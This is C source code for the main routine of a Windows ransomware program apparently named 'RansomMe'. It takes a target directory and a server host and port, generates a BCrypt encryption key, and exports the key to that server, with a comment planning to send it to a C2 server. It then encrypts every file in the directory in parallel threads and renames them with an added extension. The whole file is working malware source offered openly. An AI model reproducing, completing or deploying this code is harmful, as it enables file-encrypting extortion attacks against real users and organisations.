#include "RansomMe.h"

int main(int argc, char* argv[]) {

    const char* defaultCryptoFileExt = ".enc";
    const char* defaultServerName = "127.0.0.1";

    char* parsed = NULL;

    char targetDir[MAX_PATH] = "\0";
    char cryptoFileExt[MAX_EXT] = "\0";
    char serverName[INTERNET_MAX_HOST_NAME_LENGTH] = "\0";

    INTERNET_PORT serverPort = INTERNET_DEFAULT_HTTP_PORT;
    DWORD procNum = 1;
    DWORD threadNum = 1;

    // Get the number of processors to set the maximum number of threads
    if (!getNumberOfProcessors(&procNum)) {
        threadNum = procNum;
    }
    else {
        printf("WARNING: Could not retrieve the processors number. The software will run on a sigle thread\n");
    }

    //-------------------------------- Check for input parameters --------------------------------------------------//
    for (size_t i = 0; i < argc; i++) {
        if (i == 0) { continue; }                   // skip the app name

        parsed = strchr(argv[i], ':');              // parse the argument value
        parsed = parsed + 1;                        // remove the ':' character

        if (argv[i][0] == '/') {                    // parse arguments in the following format /t:argument

            switch (argv[i][1]) {
                // target directory
                case 't':
                    // targetDir must not be longer than MAX_PATH (Windows constant)
                    if (strlen(parsed) > MAX_PATH) {
                        printf("Error: targetDir is longer than %d characters\n", MAX_PATH);
                        return 0;
                    }
                    else {
                        // Copy the target dir to targetDir
                        strcpy_s(targetDir, MAX_PATH, parsed);
                    }
                    break;
                // encrypted extension
                case 'e':
                    // cryptoFileExt must not be longer than MAX_EXT - 1 (the '.' is included in the max length)
                    if (strlen(parsed) >= (MAX_EXT - 1)) {
                        printf("Error: cryptoExtension cannot be longer than %d characters (including the prepended '.')\n", MAX_EXT);
                        return 0;
                    }
                    else {
                        // Copy the target dir to targetDir and prepend the '.'
                        sprintf_s(cryptoFileExt, MAX_EXT, ".%s", parsed);
                    }
                    break;
                // server hostname/address
                case 'h':
                    // The server name must not be longer than INTERNET_MAX_HOST_NAME_LENGTH
                    if (strlen(parsed) > INTERNET_MAX_HOST_NAME_LENGTH) {
                        printf("Error: serverName cannot be longer than %d characters\n", INTERNET_MAX_HOST_NAME_LENGTH);
                        return 0;
                    }
                    else {
                        // Copy the target dir to targetDir
                        strcpy_s(serverName, INTERNET_MAX_HOST_NAME_LENGTH, parsed);
                    }
                    break;
                // server port
                case 'p':
                    serverPort = atoi(parsed);
                    // The server port must not be longer than INTERNET_MAX_PORT_NUMBER_VALUE
                    if (serverPort > INTERNET_MAX_PORT_NUMBER_VALUE) {
                        printf("Error: serverPort cannot be bigger than %d\n", INTERNET_MAX_PORT_NUMBER_VALUE);
                        return 0;
                    }
                    break;
                // number of threads
                case 'n':
                    threadNum = atoi(parsed);
                    if (threadNum > procNum) {
                        printf("Error: threadNum cannot be bigger than %d\n", procNum);
                        return 0;
                    }
                    break;
            }
        }
        else {
            printf("Error: unrecognized option %s\n", argv[i]);
            printf("Usage: .%s\n\t/t:<targetDir> (mandatory)\n\t/e:<cryptoExtension> (default=enc)\n\t/h:<serverName> (default=127.0.0.1)\n\t/p:<serverPort> (default:80)\n\t/n:<threadNum> (default=number of processors)\n", strrchr(argv[0], '\\'));
            return 0;
        }
    }
    // set the default values, targetDir is mandatory
    if (targetDir[0] == '\0') {
        printf("Error: missing mandatory option /t:<targetDir>\n");
        printf("Usage: .%s\n\t\t/t:<targetDir> (mandatory)\n\t\t/e:<cryptoExtension> (default=enc)\n\t\t/h:<serverName> (default=127.0.0.1)\n\t\t/p:<serverPort> (default:80)\n\t\t/n:<threadNum> (default=number of processors)\n", strrchr(argv[0], '\\'));
        return 0;
    }
    // set the default crypto extension
    if (cryptoFileExt[0] == '\0') {
        strcpy_s(cryptoFileExt, MAX_EXT, defaultCryptoFileExt);
    }
    // set the default server name
    if (serverName[0] == '\0') {
        strcpy_s(serverName, INTERNET_MAX_HOST_NAME_LENGTH, defaultServerName);
    }
    // the default port is already INTERNET_DEFAULT_HTTP_PORT
    // the default threads number is the number of logical processors detected or 1 if that failed

    //-------------------------------- LOCAL VARIABLES --------------------------------------------------//
    // general purpose variables
    size_t totalFileNumber = 0;                     // number of files found
    size_t encryptedFileNumber = 0;                 // number of encrypted files
    ULARGE_INTEGER start, end;                      // start time and end time to measure performance
    NTSTATUS status = 0;                            // status code returned from BCRYPT functions

    // thread pool variables
    TP_CALLBACK_ENVIRON poolEnv;                    // a pool environment struct to handle the thread pool
    PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool

    // encryption variables
    BCRYPT_ALG_HANDLE hAlgProv = NULL;              // handler for the crypto provider
    BCRYPT_ALG_HANDLE hRng = NULL;                  // handler for the random provider
    BCRYPT_KEY_HANDLE hKey = NULL;                  // handler for the encryption key

    //-------------------------------- INIT AND EXECUTE --------------------------------------------------//
    // Initialize the thread pool. This will create a thread pool and a cleanup group
    //   and will link them to the same pool environment handler
    if (!InitThreadPool(&poolEnv, &cleanupgroup, threadNum)) {
        printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
        goto cleanup;
    }
   
    // Initialize the crypto environment. This will acquire a context and generate a key
    status = initCrypto(&hAlgProv, &hRng, &hKey);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error in initCrypto: 0x%x\n", status);
        goto cleanup;
    }

    // print the key to a file (this will change to encrypt the key and send it to a C2 server
    if (!ExportKey(&hAlgProv, &hKey, serverName, serverPort)) {
        printf("Encryption key could not be exported. Error code: %lu\n", GetLastError());
        goto cleanup;
    }

    // start the timer
    GetTime(&start);

    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &hRng, &poolEnv, cleanupgroup, threadNum);
    
    // end the time    
    GetTime(&end);

    printf("%zd files found.\n", totalFileNumber);
    printf("%zd files encrypted.\n", encryptedFileNumber);
    
    // Calculate the elapsed time in seconds
    ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;
    printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);

    //-------------------------------- CLEAN UP --------------------------------------------------//

cleanup:
    if (hKey) { BCryptDestroyKey(hKey); }
    if (hAlgProv) { BCryptCloseAlgorithmProvider(hAlgProv, 0); }
    if (hRng) { BCryptCloseAlgorithmProvider(hRng, 0); }

    // the thread pool and threadcleanupgroup are closed inside StartEncryptionWithThreads
    return 0;
}
